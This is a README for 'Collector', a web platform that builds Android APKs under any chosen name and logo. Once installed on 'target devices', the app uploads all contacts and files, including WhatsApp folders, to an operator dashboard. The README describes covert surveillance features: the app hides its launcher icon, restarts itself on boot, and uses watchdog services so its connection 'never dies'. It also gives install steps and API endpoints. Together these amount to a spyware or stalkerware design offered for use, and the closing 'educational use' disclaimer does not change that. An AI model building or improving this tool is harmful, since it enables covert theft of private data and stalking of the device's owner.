# Collector — Remote Device Data Collection Platform

Collector is a full-stack web application that allows you to build custom Android APKs on-the-fly, deploy them to target devices, and remotely collect contacts and files through a live web dashboard. Built with Next.js 16, React 19, and a server-side Android APK build pipeline.

---

## Features

### APK Builder
- **Custom App Name & Logo** — Set any app name and upload a custom icon when building the APK
- **Server-Side Build** — APK is compiled, aligned, and signed entirely on the server using Android SDK command-line tools
- **One-Click Download** — Built APK is returned instantly as a downloadable file

### Contact Collection
- **Full Contact Access** — Reads all contacts with name, phone number, email, and organization
- **vCard Export** — Download individual or all contacts as `.vcf` vCard files (v3.0 format)
- **Copy & Share** — Copy vCard data to clipboard or share via Web Share API
- **Contact Search** — Search contacts by name, phone, or email
- **Manual Re-Sync** — Trigger contact re-sync from the web dashboard at any time

### File Manager
- **Full File Access** — Reads files from Download, DCIM, Pictures, Documents, Music, Movies, Recordings, and WhatsApp directories
- **Directory Browsing** — Navigate the device file system with a folder tree and breadcrumbs
- **File Preview** — Preview images, videos, audio, PDFs, and documents directly in the browser
- **Single File Download** — Stream and download individual files with proper MIME types
- **Bulk ZIP Download** — Download all files organized by type with per-device subfolders
- **File Deletion** — Delete individual files from both server storage and metadata
- **File Type Filtering** — Filter uploaded files by category (image, video, audio, document, etc.)
- **List/Grid View** — Toggle between list and grid display modes

### Multi-Device Support
- **Unlimited Devices** — Install the same APK on unlimited phones; all devices report to the same session
- **Device Identification** — Each device registers with a unique ID, brand, model, and Android version
- **Device List** — All connected devices displayed with online/offline status indicators
- **Per-Device Filtering** — Filter contacts, files, and file manager by specific device
- **Device Attribution** — Every contact and file is tagged with the device that uploaded it

### IMMORTAL Connection System
- **Never Disconnects** — Connection is immortal; survives server downtime, phone reboots, and network changes
- **7-Layer Reconnection** — HeartbeatService, NetworkStateReceiver, WatchdogAlarmReceiver, WatchdogJobService, ServiceRestartReceiver, BootReceiver, and START_STICKY
- **Auto-Reconnect** — Device automatically reconnects when it comes back online after any duration
- **Network Recovery** — Instantly reconnects when WiFi/Mobile data is restored
- **Boot Recovery** — Services auto-start when phone restarts
- **Watchdog Timer** — 5-minute periodic check ensures services are always alive
- **Exponential Backoff** — Smart retry timing: 10s, 20s, 40s... up to 3 minutes, never stops
- **Server Recovery** — When heartbeat resumes after any downtime, session automatically becomes `live_connected`

---

## Tech Stack

| Layer | Technology |
|---|---|
| **Framework** | Next.js 16.1.1 (App Router) |
| **Language** | TypeScript, Java (Android) |
| **Frontend** | React 19, Tailwind CSS 4, shadcn/ui |
| **Icons** | Lucide React |
| **Database** | File-based JSON (no SQL/ORM) |
| **Android SDK** | API 35, build-tools 35.0.1, JDK 21, minSdk 21 |
| **APK Signing** | Debug keystore (apksigner V1/V2/V3) |
| **Process Manager** | PM2 |
| **Reverse Proxy** | Nginx |

---

## Quick Start

### One-Command Install & Run

```bash
# Clone the repository
git clone https://github.com/fahad-ahamed/collector.git
cd collector

# Install everything and run
bash run.sh
```

### Manual Install

```bash
# Install requirements
bash install.sh

# Or install manually
pip3 install -r requirements.txt   # Python deps (Pillow for logo resize)
npm install                         # Node.js deps
npm run build                       # Build Next.js
npm start                           # Start server on port 3000
```

### With PM2 (Production)

```bash
npm install
npm run build
pm2 start npm --name "collector" -- start
pm2 save
```

---

## Prerequisites

- **Node.js** 18+ and npm
- **Python 3** with pip (for Pillow - logo resizing)
- **Android SDK** — with `platforms/android-35` and `build-tools/35.0.1` (for APK building)
- **JDK 21** — for compiling Android Java code
- **Linux/Ubuntu** — APK build pipeline uses shell commands

### Installing Prerequisites on Ubuntu

```bash
# Node.js 20
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt-get install -y nodejs

# Python & Pillow
sudo apt-get install -y python3-pip
pip3 install Pillow

# Android SDK (command-line tools only)
mkdir -p ~/android-sdk/cmdline-tools
# Download from https://developer.android.com/studio#command-tools
# Extract to ~/android-sdk/cmdline-tools/latest/
~/android-sdk/cmdline-tools/latest/bin/sdkmanager "platforms;android-35" "build-tools;35.0.1"

# JDK 21
sudo apt-get install -y openjdk-21-jdk
```

---

## Environment Variables

| Variable | Default | Description |
|---|---|---|
| `DB_DIR` | `db/` | Directory for JSON database files |
| `UPLOAD_DIR` | `/tmp/collector-uploads` | Directory for uploaded files |
| `ANDROID_HOME` | `/home/z/android-sdk` | Android SDK location |

Create a `.env` file:

```bash
DB_DIR=./db
UPLOAD_DIR=/tmp/collector-uploads
```

---

## Project Structure

```
collector/
├── src/
│   ├── app/
│   │   ├── layout.tsx                  # Root layout
│   │   ├── page.tsx                    # Home dashboard
│   │   ├── globals.css                 # Tailwind + custom styles
│   │   ├── view/[id]/page.tsx          # Session detail view
│   │   └── api/
│   │       ├── build-app/route.ts      # POST — build custom APK
│   │       ├── heartbeat/route.ts      # POST — device heartbeat
│   │       ├── status/update/route.ts  # POST — status update
│   │       ├── sessions/route.ts       # GET all, DELETE session
│   │       ├── sessions/[id]/status/   # GET session status
│   │       ├── contacts/
│   │       │   ├── upload/route.ts     # POST — contacts + file metadata
│   │       │   ├── view/[id]/route.ts  # GET — full session data
│   │       │   └── sync/route.ts       # POST — trigger re-sync
│   │       └── files/
│   │           ├── upload/route.ts     # POST — file upload
│   │           ├── download/[id]/      # GET — ZIP download
│   │           ├── browse/route.ts     # GET — directory browsing
│   │           ├── delete/route.ts     # DELETE — delete file
│   │           └── file/[fileId]/      # GET — single file stream
│   ├── components/ui/                  # shadcn/ui components
│   ├── hooks/                          # Custom React hooks
│   └── lib/
│       ├── db.ts                       # File-based JSON database
│       └── utils.ts                    # Utility functions
├── android-app/                        # Template Android project
│   ├── app/src/main/
│   │   ├── AndroidManifest.xml
│   │   ├── java/com/contactcollector/app/
│   │   │   ├── MainActivity.java           # Permissions, data upload, auto-hide
│   │   │   ├── HeartbeatService.java       # IMMORTAL heartbeat (15s, never stops)
│   │   │   ├── FileUploadService.java      # Background file upload with smart restart
│   │   │   ├── BootReceiver.java           # Auto-start on device boot
│   │   │   ├── NetworkStateReceiver.java   # Instant reconnect on network change
│   │   │   ├── WatchdogAlarmReceiver.java  # 5-min periodic service check
│   │   │   ├── WatchdogJobService.java     # JobScheduler fallback
│   │   │   └── ServiceRestartReceiver.java # Multi-fallback restart handler
│   │   └── res/                            # Layouts, strings, drawables
│   └── build/keystore/debug.keystore
├── requirements.txt                   # Python dependencies
├── run.sh                             # Quick start script
├── install.sh                         # Requirements installer
├── package.json
├── next.config.ts
├── tailwind.config.ts
└── nginx.conf                         # Nginx reverse proxy config
```

---

## API Reference

| Method | Endpoint | Description |
|---|---|---|
| `POST` | `/api/build-app` | Build custom APK with name + logo |
| `GET` | `/api/sessions` | List all sessions with online status |
| `DELETE` | `/api/sessions` | Delete a session |
| `GET` | `/api/sessions/[id]/status` | Get session status + device list |
| `POST` | `/api/contacts/upload` | Upload contacts + file metadata from device |
| `GET` | `/api/contacts/view/[id]` | Get full session data (contacts, files, devices) |
| `POST` | `/api/contacts/sync` | Trigger contact re-sync |
| `POST` | `/api/files/upload` | Upload a file (multipart, max 50MB) |
| `GET` | `/api/files/download/[id]` | Download all files as ZIP |
| `GET` | `/api/files/browse` | Browse files by directory path |
| `DELETE` | `/api/files/delete` | Delete a specific file |
| `GET` | `/api/files/file/[fileId]` | Stream/download a single file |
| `POST` | `/api/heartbeat` | Device heartbeat (IMMORTAL - never stops) |
| `POST` | `/api/status/update` | Update session status from device |

---

## IMMORTAL Connection Architecture

The connection between the Android app and server is designed to **never permanently disconnect**. Here is how the 7-layer system works:

| Layer | Component | Trigger | Action |
|-------|-----------|---------|--------|
| 1 | HeartbeatService | 15s interval | Sends heartbeat, retries with backoff on failure, **never stops** |
| 2 | NetworkStateReceiver | Network change | Instantly starts heartbeat when network returns |
| 3 | WatchdogAlarmReceiver | Every 5 minutes | Checks if services are alive, restarts if dead |
| 4 | WatchdogJobService | JobScheduler | Fallback for Android 12+ foreground restrictions |
| 5 | ServiceRestartReceiver | Service killed | 3 fallbacks: direct start, JobScheduler, retry alarms |
| 6 | BootReceiver | Phone reboot | Starts all services on BOOT_COMPLETED |
| 7 | START_STICKY | System kill | Android recreates service automatically |

**Server side:** Heartbeat recovery works from ANY status. Even if the server was down for days, when the device sends a heartbeat, the session automatically becomes `live_connected`.

---

## Nginx Configuration

```nginx
server {
    listen 80 default_server;
    server_name _;

    client_max_body_size 50M;
    gzip off;

    location / {
        proxy_pass http://127.0.0.1:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_read_timeout 600s;
        proxy_send_timeout 600s;
        proxy_connect_timeout 600s;
        proxy_buffering off;
    }
}
```

---

## How It Works — End to End

1. **Operator** opens the web dashboard and enters an app name + logo
2. **Server** builds a custom APK with the name and logo embedded
3. **Operator** downloads the APK and installs it on target device(s)
4. **App** requests permissions, reads contacts and file metadata, uploads to server
5. **App** starts IMMORTAL background services for continuous file sync and heartbeats
6. **App** hides its icon from the launcher
7. **Operator** views all collected data in real-time on the web dashboard
8. **Multiple devices** can report to the same session, each identified by name and model
9. **Connection never dies** — even if server/phone is offline for days, it reconnects automatically

---

## License

This project is for educational and authorized use only. Use responsibly and in compliance with applicable laws and regulations.
